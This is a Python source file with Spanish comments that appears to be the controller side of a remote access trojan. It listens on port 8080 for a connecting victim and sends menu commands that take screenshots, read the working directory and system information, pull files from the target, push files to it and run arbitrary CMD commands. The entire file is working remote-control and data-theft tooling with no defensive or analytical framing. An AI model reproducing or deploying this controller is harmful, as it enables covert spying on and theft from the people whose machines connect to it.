# -*- coding: utf-8 -*-
"""
Created on Tue May 26 21:31:05 2020

@author: MBI
"""
import socket as soc
from time import sleep
import base64


def linea_comandos(client):
    print('1-Obtener directorio actual')
    print('2-Captura de pantalla')
    print('3-Cerrar comunicacion')
    print('4-Informacion del sistema')
    print('5-Descargar archivo')
    print('6-Enviar archivo')
    print('7-Comandos CMD')
    
    while  True :
        valor=int(input('[*] Seleccina [*] :__'))
        if valor==1:
            valor='1'
            #Obtener directorio actual
            client.send(valor.encode())
            request=''
            request=client.recv(1024)
            print(request)
            print('\n')
            
        elif valor==2:
            valor='2'
            #Captura de pantalla
            client.send(valor.encode())
            contador=0
            with open('monitor-{}.png'.format(contador),'wb') as fname:
                request=client.recv(1000000)
                datos=base64.b64decode(request)
                if datos == 'Fallo':
                    print('Fallo la captura de pantalla')
                else:
                    fname.write(datos)
                    print('Captura tomada con exito')
                    fname.close()
                    contador +=1
                    
        elif valor==3:
            valor='3'
            client.send(valor.encode())
            print('Coneccion cerrada')
            client.close()
            break
   
        elif valor==4:
            valor='4'
            client.send(valor.encode())
            request=client.recv(1024)
            print(request)
            print('\n')
            
            
        elif valor==5:
            valor='5'
            client.send(valor.encode())
            request=client.recv(1024)
            if request.decode()=='OK':
                nombre=input('Nombre del archivo:__')
                ruta='C:/Users/MBI/Documents/Python_Scripts/'+nombre
                direccion=input('Direccion de objetivo:__')
                client.send(direccion.encode())
                with open(ruta,'wb') as fname:
                    request=client.recv(1000000)
                    datos=base64.b64decode(request)
                    fname.write(datos)
                    fname.close()
                    
                    
            
        elif valor==6:
            valor='6'
            client.send(valor.encode())
            request=client.recv(1024)
            if request.decode()=='OK':
                nombre=input('Nombre del archivo:__')
                client.send(nombre.encode())
                direccion=input('Direccion del archivo:__')
                with open(direccion,'rb') as fname:
                       client.send(base64.b64encode(fname.read()))
                fname.close()
                print('Archivo enviado')
                    
                
                    
        elif valor==7:
           valor='7'
           client.send(valor.encode())
           request=client.recv(1024)
           if request.decode()=='OK': 
               cmd=input('CMD:>')
               client.send(cmd.encode())
               request=client.recv(1024)
               print(request)
               print('\n')
           else:
               pass
                    
        
    return 0

def prueba_server(ip,puerto):
    try:
        server=soc.socket(soc.AF_INET,soc.SOCK_STREAM) 
        server.setsockopt(soc.SOL_SOCKET,soc.SO_REUSEADDR,1)
        server.bind((ip,puerto))
        server.listen()
    except :
      print('No se pudo levantar el server')
      exit(0)
    client,(client_ip,cliente_puerto)=server.accept()
    
    return print(' Prueba con exito')

def Main():
    port=8080
    ip=soc.gethostbyname(soc.gethostname())
    #prueba_server(ip,port)
    global server
    global client
    try:
        server=soc.socket(soc.AF_INET,soc.SOCK_STREAM) 
        server.setsockopt(soc.SOL_SOCKET,soc.SO_REUSEADDR,1)
        server.bind((ip,port))
        server.listen(1)
       
    except :
      print('No se pudo levantar el server')
      exit(0)
    print('En espera de conexion')
    client,(client_ip,cliente_puerto)=server.accept()
        

    
    comando=client.recv(1024)
    print(comando.decode(),'\nConectado con {}'.format(client_ip))
    print('\n')
    sleep(1)
    linea_comandos(client)
    exit(0)
        
    
if __name__=='__main__':
    Main()
#%%








